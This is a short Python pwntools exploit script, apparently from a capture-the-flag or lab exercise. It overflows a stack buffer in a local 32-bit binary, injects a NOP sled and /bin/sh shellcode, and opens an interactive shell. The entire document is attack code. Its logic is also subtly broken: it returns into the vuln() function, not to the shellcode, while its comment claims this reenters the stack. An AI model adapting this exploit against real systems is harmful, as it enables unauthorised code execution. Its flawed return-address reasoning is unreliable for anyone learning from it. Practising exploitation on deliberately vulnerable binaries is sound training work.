from pwn import *

context(os='linux', arch='i386')  # Target is 32-bit
binary = './vuln_binary'
elf = ELF(binary)

# Start the vulnerable process
p = process(binary)

# Shellcode to spawn /bin/sh
shellcode = asm(shellcraft.sh())
nop_sled = b"\x90" * 16

# Calculate offset (64-byte buffer + EBP + RET)
offset = 76

# Final payload
payload = nop_sled + shellcode
payload += b"A" * (offset - len(shellcode) - len(nop_sled))
payload += p32(elf.symbols['vuln'])  # Return into vuln() to reenter stack

# Send payload
p.sendlineafter("Welcome to vulnerable program!\n", payload)
p.interactive()
